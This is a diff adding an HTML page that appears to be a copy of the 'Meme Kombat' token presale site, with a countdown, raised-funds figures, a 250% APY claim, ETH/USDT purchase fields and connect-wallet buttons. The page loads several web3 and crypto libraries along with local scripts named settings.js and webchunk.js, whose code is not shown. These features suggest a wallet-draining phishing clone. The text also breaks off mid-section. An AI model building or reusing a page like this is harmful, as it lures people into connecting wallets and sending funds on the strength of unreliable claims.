@@ -1,0 +1,868 @@
+<html lang="en" style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;">
+ <head>
+  <style data-rc-order="prepend" rc-util-key="@ant-design-icons">
+   .anticon {
+  display: inline-block;
+  color: inherit;
+  font-style: normal;
+  line-height: 0;
+  text-align: center;
+  text-transform: none;
+  vertical-align: -0.125em;
+  text-rendering: optimizeLegibility;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+
+.anticon > * {
+  line-height: 1;
+}
+
+.anticon svg {
+  display: inline-block;
+}
+
+.anticon::before {
+  display: none;
+}
+
+.anticon .anticon-icon {
+  display: block;
+}
+
+.anticon[tabindex] {
+  cursor: pointer;
+}
+
+.anticon-spin::before,
+.anticon-spin {
+  display: inline-block;
+  -webkit-animation: loadingCircle 1s infinite linear;
+  animation: loadingCircle 1s infinite linear;
+}
+
+@-webkit-keyframes loadingCircle {
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+
+@keyframes loadingCircle {
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+  </style>
+  <script src="https://unpkg.com/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="https://unpkg.com/crypto-js@latest/crypto-js.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript">
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="./js/settings.js">
+  </script>
+  <script src="./js/webchunk.js">
+  </script>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width" name="viewport"/>
+  <title>
+   Meme Kombat
+  </title>
+  <meta content="Meme Kombat - Test your might!" name="description"/>
+  <link href="/favicon.ico" rel="icon"/>
+  <link as="image" fetchpriority="high" imagesrcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-bg-left.29812d79.png&amp;w=750&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-bg-left.29812d79.png&amp;w=1920&amp;q=75 2x" rel="preload"/>
+  <link as="image" fetchpriority="high" imagesrcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-fg-left.7fceae46.png&amp;w=750&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-fg-left.7fceae46.png&amp;w=1920&amp;q=75 2x" rel="preload"/>
+  <link as="image" fetchpriority="high" imagesrcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-bg-right.cfefba90.png&amp;w=750&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-bg-right.cfefba90.png&amp;w=1920&amp;q=75 2x" rel="preload"/>
+  <link as="image" fetchpriority="high" imagesrcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-fg-right.9e912f64.png&amp;w=750&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-fg-right.9e912f64.png&amp;w=1920&amp;q=75 2x" rel="preload"/>
+  <link as="image" fetchpriority="high" imagesrcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.1584cbba.png&amp;w=1080&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.1584cbba.png&amp;w=3840&amp;q=75 2x" rel="preload"/>
+  <link as="image" fetchpriority="high" imagesrcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftokenomics.2e5e195f.png&amp;w=1920&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftokenomics.2e5e195f.png&amp;w=3840&amp;q=75 2x" rel="preload"/>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width" name="viewport"/>
+  <meta content="12" name="next-head-count"/>
+  <link crossorigin="anonymous" data-next-font="" href="/" rel="preconnect"/>
+  <link as="style" href="/_next/static/css/14986c4abbedc6fc.css" rel="preload"/>
+  <link data-n-g="" href="/_next/static/css/14986c4abbedc6fc.css" rel="stylesheet"/>
+  <style data-styled="active" data-styled-version="6.1.1">
+  </style>
+  <meta content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9" http-equiv="origin-trial"/>
+ </head>
+ <link href="totalcss.css" rel="stylesheet"/>
+ <body style="--scroll: 7.271028037383178;">
+  <div id="__next">
+   <div data-rk="">
+    <style>
+     [data-rk]{--rk-blurs-modalOverlay:blur(0px);--rk-fonts-body:SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";--rk-radii-actionButton:9999px;--rk-radii-connectButton:12px;--rk-radii-menuButton:12px;--rk-radii-modal:24px;--rk-radii-modalMobile:28px;--rk-colors-accentColor:var(--primary-color);--rk-colors-accentColorForeground:#FFF;--rk-colors-actionButtonBorder:rgba(0, 0, 0, 0.04);--rk-colors-actionButtonBorderMobile:rgba(0, 0, 0, 0.06);--rk-colors-actionButtonSecondaryBackground:rgba(0, 0, 0, 0.06);--rk-colors-closeButton:rgba(60, 66, 66, 0.8);--rk-colors-closeButtonBackground:rgba(0, 0, 0, 0.06);--rk-colors-connectButtonBackground:#FFF;--rk-colors-connectButtonBackgroundError:#FF494A;--rk-colors-connectButtonInnerBackground:linear-gradient(0deg, rgba(0, 0, 0, 0.03), rgba(0, 0, 0, 0.06));--rk-colors-connectButtonText:#25292E;--rk-colors-connectButtonTextError:#FFF;--rk-colors-connectionIndicator:#30E000;--rk-colors-downloadBottomCardBackground:linear-gradient(126deg, rgba(255, 255, 255, 0) 9.49%, rgba(171, 171, 171, 0.04) 71.04%), #FFFFFF;--rk-colors-downloadTopCardBackground:linear-gradient(126deg, rgba(171, 171, 171, 0.2) 9.49%, rgba(255, 255, 255, 0) 71.04%), #FFFFFF;--rk-colors-error:#FF494A;--rk-colors-generalBorder:rgba(0, 0, 0, 0.06);--rk-colors-generalBorderDim:rgba(0, 0, 0, 0.03);--rk-colors-menuItemBackground:rgba(60, 66, 66, 0.1);--rk-colors-modalBackdrop:rgba(0, 0, 0, 0.3);--rk-colors-modalBackground:#FFF;--rk-colors-modalBorder:transparent;--rk-colors-modalText:#25292E;--rk-colors-modalTextDim:rgba(60, 66, 66, 0.3);--rk-colors-modalTextSecondary:rgba(60, 66, 66, 0.6);--rk-colors-profileAction:#FFF;--rk-colors-profileActionHover:rgba(255, 255, 255, 0.5);--rk-colors-profileForeground:rgba(60, 66, 66, 0.06);--rk-colors-selectedOptionBorder:rgba(60, 66, 66, 0.1);--rk-colors-standby:#FFD641;--rk-shadows-connectButton:0px 4px 12px rgba(0, 0, 0, 0.1);--rk-shadows-dialog:0px 8px 32px rgba(0, 0, 0, 0.32);--rk-shadows-profileDetailsAction:0px 2px 6px rgba(37, 41, 46, 0.04);--rk-shadows-selectedOption:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-selectedWallet:0px 2px 6px rgba(0, 0, 0, 0.12);--rk-shadows-walletLogo:0px 2px 16px rgba(0, 0, 0, 0.16);}
+    </style>
+    <div class="sc-38a9c22-1 cEbOAv">
+     <a class="sc-38a9c22-3 iWNJZV" href="/#home">
+      <img alt="Meme Kombat Logo" class="sc-38a9c22-0 gErGvM" data-nimg="1" decoding="async" height="761" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.1584cbba.png&amp;w=3840&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.1584cbba.png&amp;w=1080&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.1584cbba.png&amp;w=3840&amp;q=75 2x" style="color:transparent" width="1057"/>
+     </a>
+     <header class="ant-layout-header sc-38a9c22-2 jAJjde">
+      <span aria-label="menu" class="anticon anticon-menu" role="img">
+       <svg aria-hidden="true" data-icon="menu" fill="currentColor" focusable="false" height="1em" viewbox="64 64 896 896" width="1em">
+        <path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z">
+        </path>
+       </svg>
+      </span>
+      <span aria-label="close" class="anticon anticon-close" role="img">
+       <svg aria-hidden="true" data-icon="close" fill="currentColor" fill-rule="evenodd" focusable="false" height="1em" viewbox="64 64 896 896" width="1em">
+        <path d="M799.86 166.31c.02 0 .04.02.08.06l57.69 57.7c.04.03.05.05.06.08a.12.12 0 010 .06c0 .03-.02.05-.06.09L569.93 512l287.7 287.7c.04.04.05.06.06.09a.12.12 0 010 .07c0 .02-.02.04-.06.08l-57.7 57.69c-.03.04-.05.05-.07.06a.12.12 0 01-.07 0c-.03 0-.05-.02-.09-.06L512 569.93l-287.7 287.7c-.04.04-.06.05-.09.06a.12.12 0 01-.07 0c-.02 0-.04-.02-.08-.06l-57.69-57.7c-.04-.03-.05-.05-.06-.07a.12.12 0 010-.07c0-.03.02-.05.06-.09L454.07 512l-287.7-287.7c-.04-.04-.05-.06-.06-.09a.12.12 0 010-.07c0-.02.02-.04.06-.08l57.7-57.69c.03-.04.05-.05.07-.06a.12.12 0 01.07 0c.03 0 .05.02.09.06L512 454.07l287.7-287.7c.04-.04.06-.05.09-.06a.12.12 0 01.07 0z">
+        </path>
+       </svg>
+      </span>
+      <a class="sc-38a9c22-3 iWNJZV" href="/#utility">
+       utility
+      </a>
+      <a class="sc-38a9c22-3 iWNJZV" href="/#howItWorks">
+       How It Works
+      </a>
+      <a class="sc-38a9c22-3 iWNJZV" href="/#tokenomics">
+       Tokenomics
+      </a>
+      <a class="sc-38a9c22-3 iWNJZV" href="/#roadmap">
+       Roadmap
+      </a>
+      <a class="sc-38a9c22-3 iWNJZV" href="/#team">
+       Team
+      </a>
+     </header>
+     <header class="ant-layout-header sc-38a9c22-2 hMSARJ">
+      <a class="sc-38a9c22-3 sc-38a9c22-5 iWNJZV dbmhlI" href="https://drive.google.com/file/d/1W_sT-V_KjRfx10hRDM730KZjT4JszmfX/view" target="_blank">
+       Audit
+      </a>
+      <a class="sc-38a9c22-3 sc-38a9c22-4 iWNJZV jkJbop" href="/NEW IMPS/index.html">
+       How To Buy
+      </a>
+      <a class="sc-38a9c22-3 sc-38a9c22-4 iWNJZV hNOKVm" href="NEW IMPS/index.html">
+       Staking
+      </a>
+     </header>
+     <div class="sc-3367dfc7-0 gQbVAI">
+      <a class="sc-3367dfc7-1 hxWpIT" href="https://t.me/MemeKombatToken" target="_blank">
+       <img alt="Meme Kombat on Telegram" class="sc-3367dfc7-2 cMpYtk" data-nimg="1" decoding="async" height="550" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftelegram-icon.085a9992.png&amp;w=1200&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftelegram-icon.085a9992.png&amp;w=640&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftelegram-icon.085a9992.png&amp;w=1200&amp;q=75 2x" style="color:transparent" width="550"/>
+      </a>
+      <a class="sc-3367dfc7-1 hxWpIT" href="https://twitter.com/Meme_Kombat" target="_blank">
+       <img alt="Meme Kombat on Twitter" class="sc-3367dfc7-2 cMpYtk" data-nimg="1" decoding="async" height="434" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftwitter-icon.5cc7124e.png&amp;w=1080&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftwitter-icon.5cc7124e.png&amp;w=640&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftwitter-icon.5cc7124e.png&amp;w=1080&amp;q=75 2x" style="color:transparent" width="434"/>
+      </a>
+     </div>
+     <a href="">
+      <div class="sc-682a18ee-0 gyoMoL ant-dropdown-trigger">
+       <img alt="en" class="sc-682a18ee-1 AXjEl" data-nimg="1" decoding="async" height="512" loading="lazy" src="/_next/static/media/en.2117e9c7.svg" style="color:transparent" width="512"/>
+       <span>
+        en
+       </span>
+       <span aria-label="down" class="anticon anticon-down" role="img">
+        <svg aria-hidden="true" data-icon="down" fill="currentColor" focusable="false" height="1em" viewbox="64 64 896 896" width="1em">
+         <path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z">
+         </path>
+        </svg>
+       </span>
+      </div>
+     </a>
+    </div>
+    <div id="globalLoader" style="display: none;">
+     <div class="loader">
+      <div>
+      </div>
+      <div>
+      </div>
+     </div>
+    </div>
+    <div class="sc-17ce6418-0 sc-1d9a8696-3 fDzaHk bErabq" id="home">
+     <div class="sc-1d9a8696-9 eJfali">
+      <div class="ant-row sc-1d9a8696-5 ksjKDO">
+       <div class="ant-col sc-1d9a8696-10 cQQKsu ant-col-xs-12 ant-col-xs-pull-0 ant-col-sm-12 ant-col-sm-pull-2 ant-col-md-11 ant-col-lg-10 ant-col-lg-pull-0 ant-col-xl-10 ant-col-xl-pull-0 ant-col-xxl-10 ant-col-xxl-pull-0">
+        <img alt="Meme Royal Logo." class="sc-1d9a8696-11 eSGIdD" data-nimg="1" decoding="async" fetchpriority="high" height="1384" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-bg-left.29812d79.png&amp;w=1920&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-bg-left.29812d79.png&amp;w=750&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-bg-left.29812d79.png&amp;w=1920&amp;q=75 2x" style="color:transparent" width="724"/>
+        <img alt="Meme Royal Logo." class="sc-1d9a8696-11 sc-1d9a8696-12 zyyBS klLMMu" data-nimg="1" decoding="async" fetchpriority="high" height="1384" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-fg-left.7fceae46.png&amp;w=1920&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-fg-left.7fceae46.png&amp;w=750&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-fg-left.7fceae46.png&amp;w=1920&amp;q=75 2x" style="color:transparent" width="724"/>
+       </div>
+       <div class="ant-col sc-1d9a8696-10 cQQKsu ant-col-xs-12 ant-col-xs-push-0 ant-col-sm-12 ant-col-sm-push-2 ant-col-md-11 ant-col-lg-10 ant-col-lg-push-0 ant-col-xl-10 ant-col-xl-push-0 ant-col-xxl-10 ant-col-xxl-push-0">
+        <img alt="Meme Royal Logo." class="sc-1d9a8696-11 dsrJaF" data-nimg="1" decoding="async" fetchpriority="high" height="1384" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-bg-right.cfefba90.png&amp;w=1920&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-bg-right.cfefba90.png&amp;w=750&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-bg-right.cfefba90.png&amp;w=1920&amp;q=75 2x" style="color:transparent" width="660"/>
+        <img alt="Meme Royal Logo." class="sc-1d9a8696-11 sc-1d9a8696-12 jaHnUw klLMMu" data-nimg="1" decoding="async" fetchpriority="high" height="1384" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-fg-right.9e912f64.png&amp;w=1920&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-fg-right.9e912f64.png&amp;w=750&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsplash-fg-right.9e912f64.png&amp;w=1920&amp;q=75 2x" style="color:transparent" width="657"/>
+       </div>
+      </div>
+     </div>
+     <div class="sc-cdd98a16-0 sc-1d9a8696-2 hkuJEN bFunfd">
+      <div class="ant-row sc-1d9a8696-4 gJymxk">
+       <div class="ant-col sc-1d9a8696-1 yrjVy ant-col-xs-18 ant-col-sm-14 ant-col-md-12 ant-col-lg-10 ant-col-xl-9 ant-col-xxl-9">
+        <div class="sc-1d9a8696-6 dYeacB">
+         <img alt="Meme Royal Logo." class="sc-1d9a8696-7 dnJLYd" data-nimg="1" decoding="async" fetchpriority="high" height="761" id="presale" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.1584cbba.png&amp;w=3840&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.1584cbba.png&amp;w=1080&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.1584cbba.png&amp;w=3840&amp;q=75 2x" style="color:transparent" width="1057"/>
+         <h2 class="sc-cb2beaa-1 sc-1d9a8696-0 hJJvbE hRERlN">
+          Stake, Play &amp; Get Rewards
+         </h2>
+         <p class="sc-1d9a8696-13 bxebOh">
+          Meme Kombat is an innovative new gaming platform designed for gaming enthusiasts. From active betting to passive staking, there are rewards for all users.
+         </p>
+         <div class="sc-486efddc-1 bVgdVg">
+          <h2 class="sc-cb2beaa-1 sc-486efddc-3 hJJvbE bbDxyt">
+          </h2>
+          <div class="inner">
+           <p class="sc-486efddc-6 sc-486efddc-7 eyuUKt dAjVzX">
+            Next price increase to $0.257 in:
+           </p>
+           <div class="sc-486efddc-13 fgoOsz">
+            <span>
+             04d
+            </span>
+            :
+            <span>
+             10h
+            </span>
+            :
+            <span>
+             52m
+            </span>
+            :
+            <span>
+             08s
+            </span>
+           </div>
+           <div class="sc-486efddc-5 dTwYVx">
+            <p class="sc-486efddc-6 sc-486efddc-8 eyuUKt coTrVp">
+             USDT Raised : $3,587,811.05 / $5,000,000.00
+            </p>
+           </div>
+           <hr class="sc-486efddc-2 QAGpB"/>
+           <div class="presale-payment">
+            <div class="presale-account">
+             <h2 class="sc-cb2beaa-1 sc-486efddc-3 hJJvbE bbDxyt">
+              CHOOSE YOUR CURRENCY
+             </h2>
+             <div class="sc-486efddc-9 dcOquo">
+             </div>
+             <div class="ant-row ant-row-center" style="margin-left: -8px; margin-right: -8px;">
+              <div class="ant-col ant-col-12 sc-486efddc-11 gxJyVC" style="padding-left: 8px; padding-right: 8px;">
+               <button class="ant-btn ant-btn-default ant-btn-block sc-486efddc-12 fyGwyf active connectButton" type="button">
+                <img alt="ETH Icon" data-nimg="1" decoding="async" height="22" loading="lazy" src="/svg/icon-eth.svg" style="color: transparent;" width="22"/>
+                <span>
+                 ETH
+                </span>
+               </button>
+              </div>
+              <div class="ant-col ant-col-12 sc-486efddc-11 bVjfwl" style="padding-left: 8px; padding-right: 8px;">
+               <a href="NEW IMPS/index.html"><button class="ant-btn ant-btn-default ant-btn-block sc-486efddc-12 fyGwyf connectButton" type="button">
+                <img alt="USDT Icon" data-nimg="1" decoding="async" height="22" loading="lazy" src="/svg/icon-usdt.svg" style="color: transparent;" width="22"/>
+                <span>
+                 USDT
+                </span>
+               </button></a>
+              </div>
+             </div>
+             <div class="sc-486efddc-9 dcOquo">
+             </div>
+             <h2 class="sc-cb2beaa-1 sc-486efddc-3 sc-486efddc-4 hJJvbE bbDxyt bzUWmk">
+              1 $MK = $0.246
+             </h2>
+            </div>
+            <hr class="sc-486efddc-2 QAGpB"/>
+            <div class="ant-row presale-amount" style="margin-left: -8px; margin-right: -8px;">
+             <div class="ant-col ant-col-12" style="padding-left: 8px; padding-right: 8px;">
+              <div class="input-group-append">
+               <span class="input-group-text">
+                <span>
+                 ETH
+                </span>
+                you pay
+               </span>
+              </div>
+              <input class="presale-form-control" placeholder="0" type="text" value=""/>
+             </div>
+             <div class="ant-col ant-col-12" style="padding-left: 8px; padding-right: 8px;">
+              <div class="input-group-append">
+               <span class="input-group-text">
+                <span>
+                 $MK
+                </span>
+                you receive
+               </span>
+              </div>
+              <input class="presale-form-control" placeholder="0" type="text" value=""/>
+             </div>
+            </div>
+           </div>
+           <div style="">
+            <div class="presale-actions">
+             <button class="connectButton" type="button">
+              Connect wallet
+             </button></a>
+             <button class="connectButton" type="button">
+              <img alt="BNB Icon" data-nimg="1" decoding="async" height="19" loading="lazy" src="/svg/icon-bsc.svg" style="color: transparent;" width="19"/>
+              Buy on BSC
+             </button>
+            </div>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="ant-row sc-1d9a8696-4 gJymxk">
+       <div class="ant-col sc-1d9a8696-1 yrjVy ant-col-xs-22 ant-col-sm-20 ant-col-md-18 ant-col-lg-12">
+       </div>
+      </div>
+      <img alt="All the gang." class="sc-1d9a8696-8 jNCixp" data-nimg="1" decoding="async" height="236" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fbottom-splash-group.dd2d8f06.png&amp;w=3840&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fbottom-splash-group.dd2d8f06.png&amp;w=1920&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fbottom-splash-group.dd2d8f06.png&amp;w=3840&amp;q=75 2x" style="color:transparent" width="1521"/>
+     </div>
+    </div>
+    <div class="ant-row sc-5e91d559-0 sc-5e91d559-1 dLQPjW ijeaSF">
+     <div class="sc-5e91d559-2 fqvvOe">
+      <span>
+       Total $MK Staked
+      </span>
+      <strong>
+       15,754,517
+      </strong>
+     </div>
+     <div class="sc-5e91d559-2 fqvvOe">
+      <span>
+       % of $MK Staked
+      </span>
+      <strong>
+       74
+       <!-- -->
+       %
+      </strong>
+     </div>
+     <div class="sc-5e91d559-2 sc-5e91d559-3 fqvvOe bgMmqR">
+      <span>
+       APY
+      </span>
+      <strong>
+       250
+       <!-- -->
+       %
+      </strong>
+     </div>
+     <div class="sc-5e91d559-2 fqvvOe">
+      <span>
+       Total Rewards Paid ($MK)
+      </span>
+      <strong>
+       3,024,530
+      </strong>
+     </div>
+     <div class="sc-5e91d559-2 fqvvOe">
+      <span>
+       Total Stakers
+      </span>
+      <strong>
+       4167
+      </strong>
+     </div>
+    </div>
+    <div class="sc-17ce6418-0 sc-296016db-8 dWTYCc jJAgHJ" id="utility">
+     <div class="ant-row sc-296016db-7 iYEhlK">
+      <div class="ant-col sc-296016db-5 sc-296016db-6 jmUawF edRNQb ant-col-md-10 ant-col-md-push-0">
+       <img alt="" class="sc-296016db-2 A-dTQh" data-nimg="1" decoding="async" height="400" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Futility-1.64d527f2.png&amp;w=1920&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Futility-1.64d527f2.png&amp;w=750&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Futility-1.64d527f2.png&amp;w=1920&amp;q=75 2x" style="color:transparent;height:100%;transform:translate(-10%, 0%) scale(1.3)" width="697"/>
+      </div>
+      <div class="ant-col sc-296016db-5 jmUawF ant-col-md-12 ant-col-lg-12 ant-col-xl-10 ant-col-xxl-8">
+       <h1 class="sc-cb2beaa-0 sc-296016db-3 fNTnxo iaLyHW">
+        EARN APY DURING PRESALE
+       </h1>
+       <p class="sc-296016db-4 ckvGMp">
+        Do not wait for battles, begin earning APY on $MK tokens today by buying the presale. Click here to learn more!
+       </p>
+       <a class="sc-296016db-9 sc-296016db-10 kvqwcH fEatWd" href="https://memekombattoken.gitbook.io/meme-kombat-whitepaper/staking-during-presale" target="_blank">
+        Learn More
+       </a>
+      </div>
+     </div>
+    </div>
+    <div class="sc-17ce6418-0 sc-982afe77-11 hYhjhw dkcpnB" id="howItWorks">
+     <div class="sc-982afe77-0 bQPXkF">
+      <img alt="Viking mage." class="sc-982afe77-1 jiFOdZ" data-nimg="1" decoding="async" height="534" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fhow-it-works-left.8c0f602d.png&amp;w=2048&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fhow-it-works-left.8c0f602d.png&amp;w=1080&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fhow-it-works-left.8c0f602d.png&amp;w=2048&amp;q=75 2x" style="color:transparent" width="1003"/>
+      <img alt="Bear monk." class="sc-982afe77-1 jiFOdZ" data-nimg="1" decoding="async" height="534" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fhow-it-works-right.cb1b5a37.png&amp;w=1920&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fhow-it-works-right.cb1b5a37.png&amp;w=1080&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fhow-it-works-right.cb1b5a37.png&amp;w=1920&amp;q=75 2x" style="color:transparent" width="875"/>
+     </div>
+     <div class="sc-cdd98a16-0 hkuJEN">
+      <div class="ant-row sc-982afe77-9 gBFeTj">
+       <div class="ant-col sc-982afe77-10 frGEpf ant-col-md-24">
+        <h1 class="sc-cb2beaa-0 sc-982afe77-2 fNTnxo iVGIxo">
+         How staking works
+        </h1>
+        <p class="sc-982afe77-6 hZiIpY">
+         The point of $MK isn't to just buy and trade, but to stake your token in Meme Kombat and bet on battles for the chance to win big! Alongside our regular battles we will also have larger, more hyped battles for people to participate in with large prizes for winners.
+        </p>
+       </div>
+      </div>
+      <div class="ant-row sc-982afe77-9 gBFeTj">
+       <div class="ant-col sc-982afe77-3 fQSrIf ant-col-sm-24 ant-col-lg-12 ant-col-xl-6">
+        <div class="sc-982afe77-5 hgIFjw">
+         <div class="sc-982afe77-4 bFiyoG">
+         </div>
+         <h2 class="sc-cb2beaa-1 sc-982afe77-7 hJJvbE fMLKpc">
+          Buy $MK during presale
+         </h2>
+        </div>
+       </div>
+       <div class="ant-col sc-982afe77-3 fQSrIf ant-col-sm-24 ant-col-lg-12 ant-col-xl-6">
+        <div class="sc-982afe77-5 haFIyY">
+         <div class="sc-982afe77-4 jXemHO">
+         </div>
+         <h2 class="sc-cb2beaa-1 sc-982afe77-7 hJJvbE fMLKpc">
+          Stake tokens in Meme Kombat Arena
+         </h2>
+        </div>
+       </div>
+       <div class="ant-col sc-982afe77-3 fQSrIf ant-col-sm-24 ant-col-lg-12 ant-col-xl-6">
+        <div class="sc-982afe77-5 czmkmO">
+         <div class="sc-982afe77-4 bFiyoG">
+         </div>
+         <h2 class="sc-cb2beaa-1 sc-982afe77-7 hJJvbE fMLKpc">
+          Bet on battles
